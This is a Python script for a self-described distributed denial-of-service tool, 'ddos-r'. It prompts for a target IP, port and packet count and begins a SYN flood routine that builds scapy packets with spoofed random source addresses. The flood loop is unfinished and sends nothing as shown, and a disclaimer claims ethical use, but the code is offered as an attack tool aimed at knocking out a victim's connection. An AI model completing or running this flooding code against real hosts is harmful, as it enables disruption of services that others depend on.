#ddos-r version 1.0.0
import os
import random
from scapy.layers.inet import IP, TCP

#cool ascii art :3
print(r"▓█████▄ ▓█████▄  ▒█████    ██████          ██▀███  "+"\n"
      r"▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒         ▓██ ▒ ██▒"+"\n"
      r"░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   ░▒▓█▓▒░ ▓██ ░▄█ ▒"+"\n"
      r"░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒        ▒██▀▀█▄  "+"\n"
      r"░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒        ░██▓ ▒██▒"+"\n"
      r" ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░        ░ ▒▓ ░▒▓░"+"\n"
      r" ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░          ░▒ ░ ▒░"+"\n"
      r" ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░            ░░   ░ "+"\n"
      r"   ░       ░        ░ ░        ░    version 1.0.0"+"\n"
      r"a dead simple distributed denial-of-service tool"+"\n"
      r"by WIL_FU_"+"\n"
      r"in case you skids didn't get the memo, this is for ETHICAL PURPOSES ONLY"+"\n"
      "ONLY USE ON SYSTEMS YOU HAVE BEEN GIVEN EXPLICIT PERMISSION TO TEST ON")
attackTypes = ["SYN FLOOD", "ICMP FLOOD", "UDP FLOOD"]
input("strike any key to continue")
def random_ip():
    #generates a random IPv4 address, literally just any 4 numbers between 0 and 255, with some dots
    return ".".join(map(str, (random.randint(0,255)for _ in range(4))))
def syn_flood(ip, port):
    ip=input("ENTER IP ADDRESS: ")
    os.system("clear")
    s = "-----" + "SYN FLOOD CONFIG" + " CONFIG" + "-----"
    print(s)
    outputAsListItem("", s)
    outputAsListItem(f"IP ADDRESS: {ip}", s)
    outputAsListItem("PORT: ", s)
    closeList(s)
    port=input("ENTER PORT: ")
    os.system("clear")
    s = "-----" + "SYN FLOOD CONFIG" + " CONFIG" + "-----"
    print(s)
    outputAsListItem("", s)
    outputAsListItem(f"IP ADDRESS: {ip}", s)
    outputAsListItem("PORT: ", s)
    closeList(s)
    packets = input("ENTER AMOUNT OF PACKETS: ")
    os.system("clear")
    #flooding chosen port of chosen IP with SYN packets until the victim's connection shits itself
    total = 0
    print("[*] SYN FLOOD BEGIN")
    for x in range(0, int(packets)):
        s_port = random.randint(1000,9000)
        s_eq = random.randint(1000,9000)
        w_indow = random.randint(1000,9000)
        IP_packet = IP()
        IP_packet.src = random_ip()
        IP_packet.dst = ip

        TCP_packet = TCP()

def attack_type():
    os.system("clear")
    print("----ATTACK MENU----")
    print("|                 |")
    print("| [1]-SYN_FLOOD_  |")
    print("| MORE 2 COME     |")
    print("|                 |")
    print("-------------------")
    n=input("CHOOSE YOUR DESIRED ATTACK: ")
    try:
        n=int(n)
        return n
    except ValueError:
        print("INVALID NUMBER")
        quit(1)
def outputAsListItem(str, header):
    ss = "| " + str
    while len(ss) < len(header):
        ss = ss + " "
    ss = ss + "|"
    print(ss)
def closeList(header):
    ss = "|"
    end = "-"
    while len(ss) < len(header):
        ss = ss + " "
        end = end + "-"
    ss = ss + "|"
    end = end + "-"
    print(ss)
    print(end)
def attack_setup(attacktype):
    os.system("clear")
    s = "-----" + attackTypes[attacktype-1] + " CONFIG" + "-----"
    print(s)
    if attackTypes[attacktype - 1] == "SYN FLOOD":
        outputAsListItem("", s)
        outputAsListItem("IP ADDRESS: ", s)
        outputAsListItem("PORT: ", s)
        closeList(s)
#program begin
attack_setup(attack_type())